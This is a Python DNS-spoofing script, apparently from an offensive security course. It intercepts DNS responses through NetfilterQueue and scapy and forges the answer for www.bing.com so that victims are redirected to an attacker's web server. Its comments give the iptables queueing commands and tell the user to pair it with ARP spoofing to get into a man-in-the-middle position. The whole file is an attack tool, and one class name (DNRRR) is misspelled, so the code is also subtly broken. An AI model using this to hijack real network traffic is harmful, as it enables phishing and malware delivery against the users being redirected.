#!/usr/bin/env python


# If testing against remote computer run "iptables -I FORWARD -j NFQUEUE --queue-num 0" run this first to modify
# FORWARD chain that is used to keep packets by default, put them in NFQUEUE, 0 identifies that queue.
# then become MITM by also running arp spoof program

# For testing against local machine "iptables -I OUTPUT -j NFQUEUE --queue-num 0" this is the chain where packets
# leaving my computer go through. Next run "iptables -I INPUT -j NFQUEUE --queue-num 0". so we can trap all incoming
# and outgoing packets in the queue.

# test using ping. example - "ping -c 1 www.bing.com" ip should be changed to hacker provided ip.
# delete ip table we created at end - "iptables --flush"

# capture the request packets from client and save to a queue using iptables and modify then send packets
# convert the raw packet to scapy packet to modify the request

# Before installing Netfilterqueue you must have:
# Python development files, Libnetfilter_queue development files and associated dependencies.
# apt-get install build-essential python-dev libnetfilter-queue-dev
# pip install NetfilterQueue
# for python 3-3.7 do this instead "pip install NFQP3" and import this package from settings

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())   # get_payload() shows raw packet data
    # to be able to modify - convert raw packet which is unreadable into scapy packet in which we can see all layers

    if scapy_packet.haslayer(scapy.DNSRR):  # if packet has DNS response layer (DNSQR for request)
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")

            answer = scapy.DNRRR(rrname=qname, rdata="127.0.0.1")
            # rdata is hacker webserver ip where we want the victim to be redirected
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # number of answers to be sent in response. as we created only 1 answer for 1 response, modify this value.

            # remove these fields so they don't corrupt our modified packet
            # scapy will automatically recalculate them
            del scapy_packet[scapy.IP].len  # length or size of layer
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # apply changes to original packet
            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())

    packet.accept()  # accept the packet to forward it to destination else it is remains in queue forever
    # packet.drop()  # drop the packet, net connection can be cut this way as packets don't reach destination


queue = netfilterqueue.NetfilterQueue()
# create a netfilterqueue instance
queue.bind(0, process_packet)
# bind this queue to the queue (0) we created using the shell command
# process_packet is a callback executed on each packet in this queue
queue.run()
# run the queue else it will not run
